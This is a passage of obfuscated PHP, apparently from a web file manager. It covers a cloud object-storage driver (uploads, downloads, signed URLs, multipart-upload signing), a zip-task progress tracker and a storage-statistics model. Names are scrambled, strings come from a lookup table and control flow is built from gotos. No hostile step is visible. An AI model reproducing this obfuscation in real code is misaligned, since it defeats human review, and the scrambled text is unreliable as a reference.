array($E™Ë¥½…Ê£[205], $E™Ë¥½…Ê£[206], $E™Ë¥½…Ê£[207])) ? !0 : !1; } public function canWrite($E¯–¢ìğ¹) { $E¹´ÂåÜñæ =& $_SERVER[›é¼±]; $FŒÓ‚–®…‘ = $this->client->getAccessControlPolicy($this->bucket, $E¯–¢ìğ¹); if (!$FŒÓ‚–®…‘) { return !1; } return in_array($FŒÓ‚–®…‘, array($E¹´ÂåÜñæ[205], $E¹´ÂåÜñæ[206])) ? !0 : !1; } public function getContent($b„Šá‘¨é) { return $this->client->getObject($this->bucket, $b„Šá‘¨é); } public function setContent($Bî‡µ‹ø„ä, $eŠ„¶¼±ì¿ = '', $e…Úòä‡ÄÃ = false) { goto bÁ¥Ùáí¾Ñ; Dº÷Ò»´±Ù: $this->cacheMethod(null, null); $aò”“ª«¥Ä = $this->copyFile($Bî‡µ‹ø„ä, $Bî‡µ‹ø„ä, array($D‡÷´ñÌ¨[208] => $aò”“ª«¥Ä[$D‡÷´ñÌ¨[209]])); return $aò”“ª«¥Ä ? !0 : !1; goto C‚‡Û´§¦Ù; bÁ¥Ùáí¾Ñ: $D‡÷´ñÌ¨ =& $_SERVER[›é¼±]; $Bî‡µ‹ø„ä = $e…Úòä‡ÄÃ ? trim($Bî‡µ‹ø„ä, $D‡÷´ñÌ¨[8]) . $D‡÷´ñÌ¨[8] : $Bî‡µ‹ø„ä; $f»ŠÀ¸·£¬ = get_file_mime(get_path_ext($Bî‡µ‹ø„ä)); goto d¶À×ˆˆÓ¤; d¶À×ˆˆÓ¤: $aò”“ª«¥Ä = $this->client->putObject($eŠ„¶¼±ì¿, $this->bucket, $Bî‡µ‹ø„ä, $D‡÷´ñÌ¨[192], array(), $f»ŠÀ¸·£¬); if (!$aò”“ª«¥Ä) { return !1; } if ($e…Úòä‡ÄÃ) { return !0; } goto Dº÷Ò»´±Ù; C‚‡Û´§¦Ù: } public function fileSubstr($fğ°½äÇ˜½, $CÆÈî‡“Á, $B…‹ˆËéá) { $f¡†­šœ‡ª = $CÆÈî‡“Á + $B…‹ˆËéá - 1; return $this->client->getObject($this->bucket, $fğ°½äÇ˜½, array($_SERVER[›é¼±][210] => "\x62\171\x74\x65\x73\x3d{$CÆÈî‡“Á}\55{$f¡†­šœ‡ª}")); } public function upload($E„İ­«é¼ä, $c½†‹‰¨, $b‰‚ÌªŠ­Î = false, $fò‘Ğ™¿á÷ = REPEAT_REPLACE) { $EÁÁËš¸Â… =& $_SERVER[›é¼±]; $a™‡Ô†Í‹ = array($EÁÁËš¸Â…[208] => @md5_file($c½†‹‰¨)); $AÖİ™ÒÃÖ• = array($EÁÁËš¸Â…[211] => get_file_mime(get_path_ext($E„İ­«é¼ä))); if (IO::size($c½†‹‰¨) <= 1024 * 1024 * 200) { $bÚóÂÏéÙó = $this->client->putObjectFile($c½†‹‰¨, $this->bucket, $E„İ­«é¼ä, $EÁÁËš¸Â…[192], $a™‡Ô†Í‹, $AÖİ™ÒÃÖ•); return !empty($bÚóÂÏéÙó) ? $this->getPathOuter($E„İ­«é¼ä) : !1; } $a¦ùçùŠÍ = $this->client->multiUploadObject($c½†‹‰¨, $this->bucket, trim($E„İ­«é¼ä, $EÁÁËš¸Â…[8]), $a™‡Ô†Í‹, $AÖİ™ÒÃÖ•); return $a¦ùçùŠÍ ? $this->getPathOuter($E„İ­«é¼ä) : !1; } public function download($dŞ§¸š£‡, $CƒŞÍ‘¼Â½) { if (!@is_dir($this->pathFather($CƒŞÍ‘¼Â½)) && !IO::mkdir($this->pathFather($CƒŞÍ‘¼Â½))) { return !1; } $aÆ¬ÛÈ¬à = $this->client->getObject($this->bucket, $dŞ§¸š£‡, array(), $CƒŞÍ‘¼Â½); return $aÆ¬ÛÈ¬à !== !1 ? $CƒŞÍ‘¼Â½ : !1; } public function link($b‚ğƒŒâÍ, $Dˆ¡œâ²±  = array()) { $eÅÏ„Ò« =& $_SERVER[›é¼±]; if ($this->signVer == $eÅÏ„Ò«[212]) { return $this->client->getAuthenticatedURL($this->bucket, $b‚ğƒŒâÍ, 3600 * 12, $Dˆ¡œâ²± ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($b‚ğƒŒâÍ, $eÅÏ„Ò«[8]), 3600 * 12, $this->region, array(), !0, $Dˆ¡œâ²± ); } public function fileOut($F‹ÔÅ½æÖ, $c¡Ş˜ìÔ¯Â = false, $e’¿…—¶Ú = false, $c¾ñŞ£Ê¸Ê = '') { goto a‰ï§›ÈŞí; a‰ï§›ÈŞí: $d¼Ô‡·Èµ =& $_SERVER[›é¼±]; if ($this->isFileOutServer()) { return $this->fileOutServer($F‹ÔÅ½æÖ, $c¡Ş˜ìÔ¯Â, $e’¿…—¶Ú, $c¾ñŞ£Ê¸Ê); } if (!$e’¿…—¶Ú) { $e’¿…—¶Ú = $this->pathThis($F‹ÔÅ½æÖ); } goto Fƒ¯˜ŠØé’; AÀº¢—õ¥: $Cä£èÓ¯Üã = array($d¼Ô‡·Èµ[216] => $c¡Ş˜ìÔ¯Â . $d¼Ô‡·Èµ[217] . rawurlencode($e’¿…—¶Ú), $d¼Ô‡·Èµ[218] => $D‡…ÏƒÀ¼ï); $EË„¶ºª = $this->link($F‹ÔÅ½æÖ, $Cä£èÓ¯Üã); $this->fileOutLink($EË„¶ºª); goto fÌÕïõ½¾‡; Fƒ¯˜ŠØé’: $D‡…ÏƒÀ¼ï = get_file_mime(get_path_ext($e’¿…—¶Ú)); if ($D‡…ÏƒÀ¼ï == $d¼Ô‡·Èµ[213]) { return parent::fileOut($F‹ÔÅ½æÖ, $c¡Ş˜ìÔ¯Â, $e’¿…—¶Ú, $c¾ñŞ£Ê¸Ê); } $c¡Ş˜ìÔ¯Â = $c¡Ş˜ìÔ¯Â ? $d¼Ô‡·Èµ[214] : $d¼Ô‡·Èµ[215]; goto AÀº¢—õ¥; fÌÕïõ½¾‡: } public function fileOutServer($d¢Ø¹¨áÕË, $C‡¾ßåìÃ = false, $c¦¹ÔÏ§Ü‡ = false, $a„çÂ ä¡‹ = '') { parent::fileOut($d¢Ø¹¨áÕË, $C‡¾ßåìÃ, $c¦¹ÔÏ§Ü‡, $a„çÂ ä¡‹); } public function fileOutImageServer($fœ¿âö¨–ˆ, $D«‹‰²«Ãª = 250) { parent::fileOutImage($fœ¿âö¨–ˆ, $D«‹‰²«Ãª); } public function hashMd5($aÇ‚ƒ¤ÌÊí, $bÓçˆ¬ğ‡Ö = '') { $e»ñòÁšè¤ =& $_SERVER[›é¼±]; $F˜İ–Íá”¼ = $this->objectMeta($aÇ‚ƒ¤ÌÊí); if (!$F˜İ–Íá”¼) { return !1; } $bÓçˆ¬ğ‡Ö = $bÓçˆ¬ğ‡Ö ? $bÓçˆ¬ğ‡Ö : _get($F˜İ–Íá”¼, $e»ñòÁšè¤[219]); $bÓçˆ¬ğ‡Ö = $bÓçˆ¬ğ‡Ö ? $bÓçˆ¬ğ‡Ö : _get($F˜İ–Íá”¼, $e»ñòÁšè¤[209], $e»ñòÁšè¤[33]); return $bÓçˆ¬ğ‡Ö; } public function uploadFormData($bŠ ‰Ç±ğí, $AİËçÚÍÊÏ = 3600) { $dîî·Öíê =& $_SERVER[›é¼±]; $Açæ®´ÎµÜ = $this->pathFather($bŠ ‰Ç±ğí); $FößÓ”ºÚ¿ = $this->client->getHttpUploadPostParams($this->bucket, $Açæ®´ÎµÜ, $dîî·Öíê[192], $AİËçÚÍÊÏ); return array_merge((array) $FößÓ”ºÚ¿, array($dîî·Öíê[175] => $this->getHost())); } public function multiUploadFormData($E”éñä¿¥, $DÏ¦«Ü£¥è = 3600) { $b‡¿’ñÒÛ =& $_SERVER[›é¼±]; $d†‚ÓÜÚ = gmdate($b‡¿’ñÒÛ[220]); $BÉğÚñ¤ŠÏ = array(); $D·‡‚Âã = $this->client->getUploadId($this->bucket, $E”éñä¿¥, $BÉğÚñ¤ŠÏ); if (!$D·‡‚Âã) { return !1; } return array($b‡¿’ñÒÛ[221] => $D·‡‚Âã, $b‡¿’ñÒÛ[175] => $this->getHost() . $b‡¿’ñÒÛ[8] . $this->pathEncode($E”éñä¿¥), $b‡¿’ñÒÛ[222] => $d†‚ÓÜÚ, $b‡¿’ñÒÛ[93] => $E”éñä¿¥); } public function multiUploadAuthData($E££†ªá¨, $B¹Åé÷ÇĞ» = array()) { goto d•·í·—ë±; d•·í·—ë±: $fõ†›Â™× =& $_SERVER[›é¼±]; $f‹´‹õ›É¶ = isset($B¹Åé÷ÇĞ»[$fõ†›Â™×[222]]) ? $B¹Åé÷ÇĞ»[$fõ†›Â™×[222]] : gmdate($fõ†›Â™×[220]); $cÊ©òˆÁš‰ = isset($B¹Åé÷ÇĞ»[$fõ†›Â™×[168]]) ? $B¹Åé÷ÇĞ»[$fõ†›Â™×[168]] : $fõ†›Â™×[33]; goto E×’åá¾ô; d±‚„ìÓŠÜ: $f‚ÈàœÍ‘¥ = array($fõ†›Â™×[224], $fõ†›Â™×[33], $fõ†›Â™×[119], $fõ†›Â™×[33], "\x78\55\x61\155\x7a\x2d\144\x61\x74\145\72{$f‹´‹õ›É¶}", $fõ†›Â™×[8] . $this->bucket . $fõ†›Â™×[8] . $this->pathEncode($Ağ’ƒÍóÄ) . $cÊ©òˆÁš‰); if (strpos($cÊ©òˆÁš‰, $fõ†›Â™×[225]) === 0) { $f‚ÈàœÍ‘¥[0] = $fõ†›Â™×[226]; } if (isset($B¹Åé÷ÇĞ»[$fõ†›Â™×[227]]) && $B¹Åé÷ÇĞ»[$fõ†›Â™×[227]] == $fõ†›Â™×[228]) { $f‚ÈàœÍ‘¥[0] = $fõ†›Â™×[228]; } goto D‡í«É¸†­; C¯ÕŞ¯†ê½: if (strpos($cÊ©òˆÁš‰, $fõ†›Â™×[225]) === 0) { return array($fõ†›Â™×[232] => $dÂÌ×¼ã´, $fõ†›Â™×[222] => $f‹´‹õ›É¶); } return $dÂÌ×¼ã´; goto E±÷ÚÀ½øò; E×’åá¾ô: $Ağ’ƒÍóÄ = $B¹Åé÷ÇĞ»[$fõ†›Â™×[93]]; unset($B¹Åé÷ÇĞ»[$fõ†›Â™×[93]]); if (isset($B¹Åé÷ÇĞ»[$fõ†›Â™×[223]])) { $B¹Åé÷ÇĞ»[$fõ†›Â™×[222]] = $f‹´‹õ›É¶; return $this->listUploadParts($Ağ’ƒÍóÄ, $B¹Åé÷ÇĞ»); } goto d±‚„ìÓŠÜ; D‡í«É¸†­: $fÆ¶ïôğÉ = implode($fõ†›Â™×[229], $f‚ÈàœÍ‘¥); $e«å˜âÕ’ = base64_encode(hash_hmac($fõ†›Â™×[230], $fÆ¶ïôğÉ, $this->secret, !0)); $dÂÌ×¼ã´ = $fõ†›Â™×[231] . $this->accessKey . $fõ†›Â™×[4] . $e«å˜âÕ’; goto C¯ÕŞ¯†ê½; E±÷ÚÀ½øò: } public function listUploadParts($A‚‘‡µ‚İó, $D´øåŸ‹Ò” = array()) { goto DÊ‰õó÷§™; DÊ‰õó÷§™: $eá¥Ü´£· =& $_SERVER[›é¼±]; $f´„Ÿà‹Şí = str_replace($eá¥Ü´£·[233], $eá¥Ü´£·[33], $D´øåŸ‹Ò”[$eá¥Ü´£·[168]]); $AÆ½¢é¹ = $this->client->listParts($this->bucket, $A‚‘‡µ‚İó, $f´„Ÿà‹Şí); goto f‰ÔÎ«µáç; bŒÉÙèĞ¶: $aƒß„ë²³ = $this->multiUploadAuthData($A‚‘‡µ‚İó, $D´øåŸ‹Ò”); if (empty($aƒß„ë²³)) { return !1; } return array($eá¥Ü´£·[232] => $aƒß„ë²³, $eá¥Ü´£·[222] => $D´øåŸ‹Ò”[$eá¥Ü´£·[222]], $eá¥Ü´£·[234] => $AÆ½¢é¹); goto bÌÔØÆ–Œ; f‰ÔÎ«µáç: if (!$AÆ½¢é¹) { return !1; } unset($D´øåŸ‹Ò”[$eá¥Ü´£·[223]], $D´øåŸ‹Ò”[$eá¥Ü´£·[227]]); $D´øåŸ‹Ò”[$eá¥Ü´£·[93]] = $A‚‘‡µ‚İó; goto bŒÉÙèĞ¶; bÌÔØÆ–Œ: } public function getHost() { return parent::getHost() . $_SERVER[›é¼±][8] . $this->bucket; } public function size($c¾šÈçï†Í) { $f™íĞ®±Ï½ = $this->objectMeta($c¾šÈçï†Í); return $f™íĞ®±Ï½ ? $f™íĞ®±Ï½[$_SERVER[›é¼±][78]] : 0; } public function info($D…Á‰Ú¦¢À) { if ($this->isFolder($D…Á‰Ú¦¢À)) { return $this->folderInfo($D…Á‰Ú¦¢À); } else { if ($this->isFile($D…Á‰Ú¦¢À)) { return $this->fileInfo($D…Á‰Ú¦¢À); } } return !1; } public function exist($c™¿æÑ´ñÃ) { return $this->isFile($c™¿æÑ´ñÃ) || $this->isFolder($c™¿æÑ´ñÃ); } public function isFile($cåãßœ”Ø) { return !$this->isFolder($cåãßœ”Ø) && $this->objectMeta($cåãßœ”Ø); } public function isFolder($CÓ‘¬Š¦Œ­) { return $this->cacheMethod($_SERVER[›é¼±][199], $CÓ‘¬Š¦Œ­); } protected function objectMeta($D‰µº®–ˆ¨) { return $this->cacheMethod($_SERVER[›é¼±][200], $D‰µº®–ˆ¨); } protected function _objectMeta($dÃÆìŒ¡õ) { $DÒ²›ÉŸáÈ =& $_SERVER[›é¼±]; $dÃÆìŒ¡õ = rtrim($dÃÆìŒ¡õ, $DÒ²›ÉŸáÈ[8]); try { $fø¿©³Îœ¤ = $this->client->getObjectInfo($this->bucket, $dÃÆìŒ¡õ); if (!isset($fø¿©³Îœ¤[$DÒ²›ÉŸáÈ[219]]) && isset($fø¿©³Îœ¤[$DÒ²›ÉŸáÈ[235]])) { $fø¿©³Îœ¤[$DÒ²›ÉŸáÈ[219]] = $fø¿©³Îœ¤[$DÒ²›ÉŸáÈ[235]]; } } catch (Exception $DæóÍ²ó£) { $fø¿©³Îœ¤ = !1; } if (!$fø¿©³Îœ¤) { } return $fø¿©³Îœ¤; } protected function _isFolder($bÈ­õÔÀ×‘) { goto B®ê‡Ï£§ì; B®ê‡Ï£§ì: $CäŠ¨ªÕ‚ =& $_SERVER[›é¼±]; $bÈ­õÔÀ×‘ = rtrim($bÈ­õÔÀ×‘, $CäŠ¨ªÕ‚[8]); if ($bÈ­õÔÀ×‘ == $CäŠ¨ªÕ‚[33] || $bÈ­õÔÀ×‘ == $CäŠ¨ªÕ‚[8]) { return !0; } goto AÂ¦‡Ñ–à; b«–íÜù–: return !0; goto aöœÂˆ; E¡í‰‘‡: return stripos($c×õ¿ÎÉÑ×, $bÈ­õÔÀ×‘ . $CäŠ¨ªÕ‚[8]) === 0 ? !0 : !1; if (substr($c×õ¿ÎÉÑ×, -1) == $CäŠ¨ªÕ‚[8]) { return !0; } if (get_path_this($c×õ¿ÎÉÑ×) == get_path_this($bÈ­õÔÀ×‘)) { return !1; } goto b«–íÜù–; AÂ¦‡Ñ–à: $eÕ…®‰»º… = $this->client->getBucket($this->bucket, $bÈ­õÔÀ×‘, null, 1); if (empty($eÕ…®‰»º…[$CäŠ¨ªÕ‚[198]])) { return !1; } $c×õ¿ÎÉÑ× = $eÕ…®‰»º…[$CäŠ¨ªÕ‚[198]][0][$CäŠ¨ªÕ‚[28]]; goto E¡í‰‘‡; aöœÂˆ: } } define($_SERVER[›é¼±][236], 1); goto a¢èë•¶¡Ø; BñøÄÜØÄ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $E‡ß’‚ÉÚ‡ =& $_SERVER[›é¼±]; parent::startAfter(); Hook::bind($E‡ß’‚ÉÚ‡[1657], array($this, $E‡ß’‚ÉÚ‡[1652])); $d¬Ïİ­Ú¯ğ =& $this->task; $d¬Ïİ­Ú¯ğ[$E‡ß’‚ÉÚ‡[1654]] = $E‡ß’‚ÉÚ‡[1127]; if (!$d¬Ïİ­Ú¯ğ[$E‡ß’‚ÉÚ‡[1464]]) { $d¬Ïİ­Ú¯ğ[$E‡ß’‚ÉÚ‡[1464]] = LNG($E‡ß’‚ÉÚ‡[1658]); } } protected function endAfter() { $D›ƒ³ÏšÀ =& $_SERVER[›é¼±]; parent::endAfter(); Hook::unbind($D›ƒ³ÏšÀ[1657], array($this, $D›ƒ³ÏšÀ[1652])); } public function updateAfter() { $eĞôÚ¬Íğ® =& $_SERVER[›é¼±]; $bÉ§Âô =& $this->task; if (!$bÉ§Âô[$eĞôÚ¬Íğ®[1055]] || !$bÉ§Âô[$eĞôÚ¬Íğ®[758]]) { return; } if ($bÉ§Âô[$eĞôÚ¬Íğ®[1654]] == $eĞôÚ¬Íğ®[1127]) { $aÏÕÚí©©º = $bÉ§Âô[$eĞôÚ¬Íğ®[1611]]; if ($bÉ§Âô[$eĞôÚ¬Íğ®[1612]] != $eĞôÚ¬Íğ®[1127]) { $aÏÕÚí©©º = 0; } $BÚÏ¯ìçê = ($bÉ§Âô[$eĞôÚ¬Íğ®[1615]] + $aÏÕÚí©©º) / $bÉ§Âô[$eĞôÚ¬Íğ®[758]]; $bÉ§Âô[$eĞôÚ¬Íğ®[1565]] = $BÚÏ¯ìçê * 0.3; } else { if ($bÉ§Âô[$eĞôÚ¬Íğ®[1654]] == $eĞôÚ¬Íğ®[311]) { $BÚÏ¯ìçê = $bÉ§Âô[$eĞôÚ¬Íğ®[1069]] / $bÉ§Âô[$eĞôÚ¬Íğ®[1055]]; $bÉ§Âô[$eĞôÚ¬Íğ®[1565]] = 0.3 + $BÚÏ¯ìçê * 0.5; } else { if ($bÉ§Âô[$eĞôÚ¬Íğ®[1654]] == $eĞôÚ¬Íğ®[107]) { $BÚÏ¯ìçê = 0; if ($bÉ§Âô[$eĞôÚ¬Íğ®[1610]]) { $BÚÏ¯ìçê = $bÉ§Âô[$eĞôÚ¬Íğ®[1611]] / $bÉ§Âô[$eĞôÚ¬Íğ®[1610]]; } $bÉ§Âô[$eĞôÚ¬Íğ®[1565]] = 0.3 + 0.5 + $BÚÏ¯ìçê * 0.2; } } } if ($bÉ§Âô[$eĞôÚ¬Íğ®[1565]] > 0) { $bµìÂùßù— = timeFloat() - $bÉ§Âô[$eĞôÚ¬Íğ®[784]] - $bÉ§Âô[$eĞôÚ¬Íğ®[1568]]; $bÉ§Âô[$eĞôÚ¬Íğ®[1569]] = $bµìÂùßù— * (1 - $bÉ§Âô[$eĞôÚ¬Íğ®[1565]]) / $bÉ§Âô[$eĞôÚ¬Íğ®[1565]]; } } public function copyFileStart($d¼Æ†ÙöáÍ, $E·Š˜£Ô, $añíÓ¨¼, $CèŞù­œ‹, $DßôÃ¥ã®‘, $eìë®êğƒİ) { $F³×½¶Á± =& $_SERVER[›é¼±]; parent::copyFileStart($d¼Æ†ÙöáÍ, $E·Š˜£Ô, $añíÓ¨¼, $CèŞù­œ‹, $DßôÃ¥ã®‘, $eìë®êğƒİ); $b…‘‘—¾£ä =& $this->task; if ($b…‘‘—¾£ä[$F³×½¶Á±[1654]] == $F³×½¶Á±[311]) { $b…‘‘—¾£ä[$F³×½¶Á±[1654]] = $F³×½¶Á±[107]; } $this->update(); } public function copyFileEnd($fÈÌÓÆ¹£, $e¡çÔÜ‡”, $F¢ÑÓë•¸, $d—¶§‡¬çÚ, $b­êÕŠ§ÕÜ, $b‰‰Å·™) { $eìª±Ã›— =& $_SERVER[›é¼±]; $eØßÄñÔ‘‹ =& $this->task; $eØßÄñÔ‘‹[$eìª±Ã›—[1611]] = $eØßÄñÔ‘‹[$eìª±Ã›—[1610]]; $eØßÄñÔ‘‹[$eìª±Ã›—[1615]] += $eØßÄñÔ‘‹[$eìª±Ã›—[1610]]; $eØßÄñÔ‘‹[$eìª±Ã›—[1612]] = $eìª±Ã›—[33]; $this->update(); } public function nameParse($c·É£Î¨) { $cŸˆ­‰®ø =& $_SERVER[›é¼±]; $aƒéÔ¾”ˆ… =& $this->task; if ($aƒéÔ¾”ˆ…[$cŸˆ­‰®ø[1069]] < $aƒéÔ¾”ˆ…[$cŸˆ­‰®ø[1055]]) { $AÔ¶“ô–¹ë = get_path_this($c·É£Î¨); if (strstr($AÔ¶“ô–¹ë, $cŸˆ­‰®ø[95])) { $aƒéÔ¾”ˆ…[$cŸˆ­‰®ø[1069]] += 1; } } if ($aƒéÔ¾”ˆ…[$cŸˆ­‰®ø[1654]] == $cŸˆ­‰®ø[1127]) { $aƒéÔ¾”ˆ…[$cŸˆ­‰®ø[1654]] = $cŸˆ­‰®ø[311]; } $aƒéÔ¾”ˆ…[$cŸˆ­‰®ø[1608]] = $c·É£Î¨; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($D•“†æ˜¸•) { $A£ø Ï ³Á =& $_SERVER[›é¼±]; $BÜèëÖŠÑ = array($A£ø Ï ³Á[588] => array($A£ø Ï ³Á[29] => $A£ø Ï ³Á[1659], $A£ø Ï ³Á[271] => array($A£ø Ï ³Á[222], $A£ø Ï ³Á[760], $A£ø Ï ³Á[1660], $A£ø Ï ³Á[1661])), $A£ø Ï ³Á[1662] => array($A£ø Ï ³Á[29] => $A£ø Ï ³Á[1663], $A£ø Ï ³Á[271] => array($A£ø Ï ³Á[222], $A£ø Ï ³Á[758], $A£ø Ï ³Á[1664], $A£ø Ï ³Á[1665], $A£ø Ï ³Á[1666]))); if (!isset($BÜèëÖŠÑ[$D•“†æ˜¸•])) { return !1; } $this->optionType = $BÜèëÖŠÑ[$D•“†æ˜¸•][$A£ø Ï ³Á[29]]; $this->field = $BÜèëÖŠÑ[$D•“†æ˜¸•][$A£ø Ï ³Á[271]]; return !0; } public function listData($cİ¹‰â‡Í¼ = false, $fÖ¤„‘” Á = "\x6d\x6f\x64\x69\x66\x79\124\x69\x6d\x65", $F‚­œë•ßˆ = false) { return parent::listData($cİ¹‰â‡Í¼, $fÖ¤„‘” Á, $F‚­œë•ßˆ); } public function trendList($D¸åŸ±Ş’·) { goto AÓàˆŒÄ’ä; bİÍÀÅ¿¯ñ: if (!isset($f·å¢¦ë)) { $EŸ„„¼“Éì = $D¸åŸ±Ş’· == $a„šÀˆšöõ[588] ? $a„šÀˆšöõ[532] : $a„šÀˆšöõ[827]; $f·å¢¦ë = Model($EŸ„„¼“Éì)->min($a„šÀˆšöõ[194]); } $B‹¥ƒŠßÛ® = $a„šÀˆšöõ[1669] . ucfirst($D¸åŸ±Ş’·); $eö›÷¦˜ = $this->dateList($f·å¢¦ë); goto F³¿¨È°‚; F³¿¨È°‚: foreach ($eö›÷¦˜ as $dÀõß„áÏ) { $this->{$B‹¥ƒŠßÛ®}($dÀõß„áÏ); } return $this->listData(); goto DæÂ¡¥äßÜ; AÓàˆŒÄ’ä: $a„šÀˆšöõ =& $_SERVER[›é¼±]; $AŸÏõ÷À = $this->listData(); if ($AŸÏõ÷À) { $b¨¼¤İôÁ = end($AŸÏõ÷À); $dÀõß„áÏ = date($a„šÀˆšöõ[1667], strtotime($a„šÀˆšöõ[1668])); if ($b¨¼¤İôÁ[$a„šÀˆšöõ[222]] == $dÀõß„áÏ) { return $AŸÏõ÷À; } $f·å¢¦ë = strtotime($b¨¼¤İôÁ[$a„šÀˆšöõ[222]]); } goto bİÍÀÅ¿¯ñ; DæÂ¡¥äßÜ: } private function dateList($FŒ±¾±Ô¸) { $eõÌÖ¿œ„ =& $_SERVER[›é¼±]; $Cï¿ºŠ¿’ = $FŒ±¾±Ô¸; $A‰’ëøª¾ = strtotime($eõÌÖ¿œ„[1668]); $aå¨ÆÛ½² = array(); while ($Cï¿ºŠ¿’ <= $A‰’ëøª¾) { $aå¨ÆÛ½²[] = date($eõÌÖ¿œ„[1667], $Cï¿ºŠ¿’); $Cï¿ºŠ¿’ = strtotime($eõÌÖ¿œ„[1670], $Cï¿ºŠ¿’); } return $aå¨ÆÛ½²; } public function _recordUser($AÃÃ…Å²¹ = '') { goto eĞ‰¹ìù©; cÖÒ˜ÛíÁ: $D¤É¬Ò¶„ = array($f¯³’åŒà[194] => array($f¯³’åŒà[1005], $B®®°‡Œ¶¢)); $cäŠ„ãæä· = Model($f¯³’åŒà[532])->where($D¤É¬Ò¶„)->count($f¯³’åŒà[1564]); $D¤É¬Ò¶„[$f¯³’åŒà[194]] = array($f¯³’åŒà[331], array($Bİ®ßªÃî, $B®®°‡Œ¶¢)); goto dØê¬Âùª; dØê¬Âùª: $C‚šÂ¨ğŸ× = Model($f¯³’åŒà[532])->where($D¤É¬Ò¶„)->count($f¯³’åŒà[1564]); $D¤É¬Ò¶„[$f¯³’åŒà[29]] = $f¯³’åŒà[1673]; $D³ˆ…¯Ÿ™Ü = Model($f¯³’åŒà[1674])->where($D¤É¬Ò¶„)->count($f¯³’åŒà[1675]); goto fÀ™šñ²ˆ; fÀ™šñ²ˆ: $f®™çóÙÙ† = array($f¯³’åŒà[222] => $AÃÃ…Å²¹, $f¯³’åŒà[760] => (int) $cäŠ„ãæä·, $f¯³’åŒà[1660] => (int) $C‚šÂ¨ğŸ×, $f¯³’åŒà[1661] => (int) $D³ˆ…¯Ÿ™Ü); return $this->insert($f®™çóÙÙ†); goto fÈé¶ƒ¸˜î; eĞ‰¹ìù©: $f¯³’åŒà =& $_SERVER[›é¼±]; $Bİ®ßªÃî = strtotime(date($f¯³’åŒà[1671], strtotime($AÃÃ…Å²¹))); $B®®°‡Œ¶¢ = strtotime(date($f¯³’åŒà[1672], strtotime($AÃÃ…Å²¹))); goto cÖÒ˜ÛíÁ; fÈé¶ƒ¸˜î: } public function _recordStore($B‚ŠŠƒ•Ôˆ = '') { goto E‹óå ®Ë×; E‹óå ®Ë×: $Aß»®ÜŠÓõ =& $_SERVER[›é¼±]; $Cæƒ—²œë¤ = strtotime(date($Aß»®ÜŠÓõ[1672], strtotime($B‚ŠŠƒ•Ôˆ))); $FàÓ†³ŒøÉ = array($Aß»®ÜŠÓõ[194] => array($Aß»®ÜŠÓõ[1005], $Cæƒ—²œë¤)); goto B”Ùäßãëù; B”Ùäßãëù: $CÇâÚ‘æŸ = Model($Aß»®ÜŠÓõ[464])->where($FàÓ†³ŒøÉ)->sum($Aß»®ÜŠÓõ[78]); $FàÓ†³ŒøÉ[$Aß»®ÜŠÓõ[405]] = 0; $c£„ç”º¬Ò = Model($Aß»®ÜŠÓõ[827])->where($FàÓ†³ŒøÉ)->sum($Aß»®ÜŠÓõ[78]); goto e—Ô‡çÌá; a›ÏŸ˜°ß: $D®ÔÖÍäÚÄ = Model($Aß»®ÜŠÓõ[827])->where($FàÓ†³ŒøÉ)->sum($Aß»®ÜŠÓõ[78]); $dæ±—Ÿ = array($Aß»®ÜŠÓõ[222] => $B‚ŠŠƒ•Ôˆ, $Aß»®ÜŠÓõ[758] => (int) $c£„ç”º¬Ò, $Aß»®ÜŠÓõ[1664] => (int) $CÇâÚ‘æŸ, $Aß»®ÜŠÓõ[1665] => (int) $B­ƒèÌÍŸ , $Aß»®ÜŠÓõ[1666] => (int) $D®ÔÖÍäÚÄ); return $this->insert($dæ±—Ÿ); goto eÅËïÛšïÏ; e—Ô‡çÌá: $FàÓ†³ŒøÉ[$Aß»®ÜŠÓõ[406]] = 1; $B­ƒèÌÍŸ  = Model($Aß»®ÜŠÓõ[827])->where($FàÓ†³ŒøÉ)->sum($Aß»®ÜŠÓõ[78]); $FàÓ†³ŒøÉ[$Aß»®ÜŠÓõ[406]] = 2; goto a›ÏŸ˜°ß; eÅËïÛšïÏ: } public function trend($A±îñ¨œğ, $EÁÖ¨Èà¨) { goto bÑÈëÏÈ; bÑÈëÏÈ: $E°—éìÜ§ =& $_SERVER[›é¼±]; if (!$this->init($A±îñ¨œğ)) { return !1; } $AâÑ·ö†İ‹ = $this->trendList($A±îñ¨œğ); goto E½Ù§ß¢; fç¼·ëæ‹Ò: if (empty($AâÑ·ö†İ‹)) { $Bˆ²²ÕÁ¶Ê = date($E°—éìÜ§[1667], strtotime($E°—éìÜ§[1668])); $cñàù‰¾‰Ã = array($E°—éìÜ§[222] => $Bˆ²²ÕÁ¶Ê); foreach ($aÎ÷‚ôßÈ[$A±îñ¨œğ] as $f‘ÄˆÇÜè‹ => $fàæ¥ŸØ‘¥) { $cñàù‰¾‰Ã[$f‘ÄˆÇÜè‹] = 0; } $AâÑ·ö†İ‹[] = $cñàù‰¾‰Ã; } $f¸ÖÆ¢¯õÙ = array(); foreach ($AâÑ·ö†İ‹ as $fàæ¥ŸØ‘¥) { if ($A±îñ¨œğ == $E°—éìÜ§[1662] && $fàæ¥ŸØ‘¥[$E°—éìÜ§[1664]] > $fàæ¥ŸØ‘¥[$E°—éìÜ§[758]]) { $fàæ¥ŸØ‘¥[$E°—éìÜ§[1664]] = $fàæ¥ŸØ‘¥[$E°—éìÜ§[758]]; } foreach ($aÎ÷‚ôßÈ[$A±îñ¨œğ] as $f‘ÄˆÇÜè‹ => $Bå‰İâÜÄ±) { $c’±Ï‡É« = array($E°—éìÜ§[222] => $fàæ¥ŸØ‘¥[$E°—éìÜ§[222]], $E°—éìÜ§[1464] => $Bå‰İâÜÄ±); $c’±Ï‡É«[$bèÀÛèî“´[$A±îñ¨œğ]] = isset($fàæ¥ŸØ‘¥[$f‘ÄˆÇÜè‹]) ? $fàæ¥ŸØ‘¥[$f‘ÄˆÇÜè‹] : 0; $f¸ÖÆ¢¯õÙ[] = $c’±Ï‡É«; } } goto Dù„èª™¹Ä; Dù„èª™¹Ä: return $f¸ÖÆ¢¯õÙ; goto eÔ¡áÍóÒ; E½Ù§ß¢: if ($AâÑ·ö†İ‹ && $EÁÖ¨Èà¨ != $E°—éìÜ§[1537]) { $BŠÒ®†‰İ³ = $AâÑ·ö†İ‹[0][$E°—éìÜ§[222]]; $AÜ÷²áƒÌ = $this->validDate($EÁÖ¨Èà¨, $BŠÒ®†‰İ³); $AèÓŒ«³™” = array(); $F–¯†ø·¤Œ = 